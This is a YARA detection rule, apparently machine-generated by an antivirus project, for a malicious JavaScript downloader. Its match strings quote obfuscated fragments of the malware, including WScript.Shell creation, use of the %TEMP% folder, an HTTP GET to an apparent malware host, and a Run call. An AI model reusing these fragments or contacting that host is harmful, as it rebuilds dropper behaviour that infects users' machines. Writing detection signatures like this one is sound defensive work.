rule sig_20160427_aab4c010be2da50fbffd02e25feff264 {
  meta:
    description = "datamaliciousorder - file 20160427_aab4c010be2da50fbffd02e25feff264.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "12994a8ed97d80bd6a6772ea78beb331f205ce407bafd53f44d0b055c6fe7c5d"

  strings:
    $s1  = "function KdgtqPpgyn() {return EbfmyZcief[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ydZ0iXI" ascii
    $s2  = "function KdgtqPpgyn() {return EbfmyZcief[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ydZ0iXI" ascii
    $s3  = "var EbfmyZcief = function EurkiZbygq() {return TtnidHiejw[NieibLewhg](\"WScript\"+\".Shell\");}(), XetzxMezqa = 11;" fullword ascii
    $s4  = "function DecrfQvfwn(UtkfwPbpxi, LwvlxKaksn){WrcfcHfhmo = WrcfcHfhmo * 1; return UtkfwPbpxi - LwvlxKaksn;};" fullword ascii
    $s5  = "XeveoPfsmi[MppqwFpqqy](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var TtnidHiejw = this[\"WScript\"];" fullword ascii
    $s7  = "if (XeveoPfsmi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ClullVaamc(){return FjlvyKnrbc + \"\";};" fullword ascii
    $s9  = "var SitcyKrbgn = false;" fullword ascii
    $s10 = "function KgeiqTzioz()" fullword ascii
    $s11 = "}while (UmygqNujpy);" fullword ascii
    $s12 = "SitcyKrbgn = true;" fullword ascii
    $s13 = "return DecrfQvfwn(KxwypNzxxi, TkgvwJbnqd);" fullword ascii
    $s14 = "var IrgjdIcssh = false;" fullword ascii
    $s15 = "function WokftAxopr(){return NieibLewhg;};" fullword ascii
    $s16 = "IrgjdIcssh = true; " fullword ascii
    $s17 = "function TqruzEafbs(CybabGllok){EbfmyZcief[\"R\"+\"un\"](CybabGllok, WrcfcHfhmo, WrcfcHfhmo);};" fullword ascii
    $s18 = "var QmlzgFalty = new this[\"D\"+\"ate\"]();" fullword ascii
    $s19 = "function FltafMopqv(){return 23;};" fullword ascii
    $s20 = "function AzcjaJzuos() {return ((IrgjdIcssh == true) && (IrgjdIcssh == AvnoyTmtca)) ? 1 : WrcfcHfhmo;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}